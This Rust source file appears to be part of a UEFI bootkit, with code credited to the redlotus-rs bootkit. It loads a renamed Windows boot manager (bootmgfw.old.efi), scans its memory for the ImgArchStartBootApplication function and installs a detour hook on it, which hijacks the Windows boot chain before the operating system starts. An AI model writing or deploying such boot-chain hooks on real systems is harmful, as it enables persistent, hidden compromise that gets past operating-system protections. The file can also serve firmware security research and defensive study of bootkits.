use crate::IMG_ARCH_START_BOOT_APPLICATION_DETOUR;
use crate::nt::{IMG_ARCH_START_BOOT_APPLICATION_PATTERN, ImgArchStartBootApplicationType};
use crate::pe::hooks::img_arch_start_boot_application;
use crate::utils::scanner::Scanner;
use alloc::vec::Vec;
use uefi::boot::LoadImageSource;
use uefi::proto::BootPolicy::ExactMatch;
use uefi::proto::device_path::build::DevicePathBuilder;
use uefi::proto::device_path::{
     DeviceSubType, DeviceType, LoadedImageDevicePath, build,
};
use uefi::proto::loaded_image::LoadedImage;
use uefi::{Handle, Status, boot, cstr16};

pub struct Bootmgfw {
    handle: Handle,
}
impl Bootmgfw {
    // https://github.com/memN0ps/redlotus-rs/blob/master/bootkit/src/boot/pe.rs#L17
    pub fn load() -> uefi::Result<Self> {
        let loaded_image_device_path =
            boot::open_protocol_exclusive::<LoadedImageDevicePath>(boot::image_handle())?;

        let mut storage = Vec::new();
        let mut builder = DevicePathBuilder::with_vec(&mut storage);

        for node in loaded_image_device_path.node_iter() {
            if node.full_type() == (DeviceType::MEDIA, DeviceSubType::MEDIA_FILE_PATH) {
                break;
            }

            builder = builder.push(&node).unwrap();
        }

        builder = builder
            .push(&build::media::FilePath {
                path_name: cstr16!(r"EFI\Microsoft\Boot\bootmgfw.old.efi"),
            })
            .unwrap();

        let new_image_path = builder.finalize().unwrap();

        let handle = boot::load_image(
            boot::image_handle(),
            LoadImageSource::FromDevicePath {
                device_path: new_image_path,
                boot_policy: ExactMatch,
            },
        )?;

        Ok(Self { handle })
    }

    pub fn start(&self) -> uefi::Result<()> {
        boot::start_image(self.handle)
    }

    pub fn patch(&self) -> uefi::Result<()> {
        let data = boot::open_protocol_exclusive::<LoadedImage>(self.handle)?;
        let (base, size) = data.info();
        let (base, size) = (base as *const u8, size as usize);

        log::info!("Bootmgfw base: {:x}, size: {}", base as u64, size);

        let pos = match Scanner::pattern_scan(base, size, &IMG_ARCH_START_BOOT_APPLICATION_PATTERN)
        {
            None => {
                log::error!("Failed to find ImgArchStartBootApplication");
                return Err(Status::NOT_FOUND.into());
            }
            Some(pos) => pos as *const ImgArchStartBootApplicationType,
        };

        log::info!("Found ImgArchStartBootApplication at {:x}", pos as u64);

        {
            let mut detour = IMG_ARCH_START_BOOT_APPLICATION_DETOUR.lock();
            detour.init(pos, img_arch_start_boot_application as _);
            detour.detour();
        }

        Ok(())
    }
}
